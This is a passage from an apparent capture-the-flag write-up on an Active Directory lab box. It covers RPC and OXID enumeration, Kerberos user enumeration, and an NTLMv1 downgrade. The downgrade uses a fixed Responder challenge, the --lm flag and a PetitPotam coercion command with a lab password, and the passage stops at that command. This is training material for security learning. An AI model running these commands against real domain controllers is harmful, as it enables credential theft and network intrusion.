IPV6 for the win :
#

However, it has an open port 135, which hosts the RPC service. A Remote Procedure Call (RPC) is a type of interprocess communication (IPC) that allows a client to invoke procedures exposed by an RPC server. The client calls the function as if it were a standard local procedure call.

Now, how can this service be leveraged for advanced operations? RPC may have misconfigurations, such as a Null-Bind, similar to what can occur with LDAP or SMB.

Lets try this.

> rpcclient -U '' -N "10.10.10.213" -d    
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT

Well it’s not working for the Null bind.

While searching for RPC enumeration methods I came across that blog.

https://juggernaut-sec.com/ad-recon-msrpc/#Mapping_RPC_Endpoints_–_rpcmappy

As in the article we can list endpoitn mapping with rpcmap.py

> rpcmap.py 'ncacn_ip_tcp:10.10.10.213'

In this dump, we can note the presence of a very interesting endpoint, like the UID {99FCFEC4-5260-101B-BBCB-00AA0021347A} which corresponds to the IID_IObjectExporter service. As we can see in this microsoft doc

The IObjectExporter interface is used for OXID resolution. Leveraging this, it is possible to perform a clever technique that involves extracting the host’s network interfaces through this service without authentication.

If an IPv6 address is discovered, it can be utilized to identify additional services on the host, potentially expanding the attack surface.

There is a script created by the airbus team to do this tricks, the script is called IOXIDResolver.py.

To list valid users, it is possible to exploit a Kerberos concept, specifically the KRB_AS_REQ process, also known as pre-authentication. This step involves sending a Ticket Granting Ticket (TGT) request to the Key Distribution Center (KDC) on the domain controller (DC). The DC then responds with either a TGT or an error.

This error can be used to determine whether a user exists. For this task, the kerbrute script is an excellent tool.

PS: don’t forget to change the port on your socat tunnel.

Exploit NTLMv1 :
#

The Domain Controller supports NTLMv1, which is surprising to some. NTLMv1 uses outdated cryptographic methods, making it vulnerable. It is possible to downgrade to NTLMv1, disable SSP, and crack the hash using a site like cracks.sh. Additionally, session relaying on services like LDAP can be done to perform RBCD, though this scenario is not applicable on this box.

I first, edit the /etc/responder/Responder.conf file to include the magical 1122334455667788 challenge, that will disable protection like ESS/SSP.

HTTPS = On
DNS = On
LDAP = On
...
; Custom challenge.
; Use "Random" for generating a random challenge for each requests (Default)
Challenge = 1122334455667788

start Responder with --lm for be downgraded.

> Responder.py -I tun0 --lm

Now, run coercion with Petitpotam.

> petitpotam.py -d "htb.local" -u "henry.vinson_adm" -p 'G1#Ny5@2dvht' "10.10.14.11" "htb6.local"
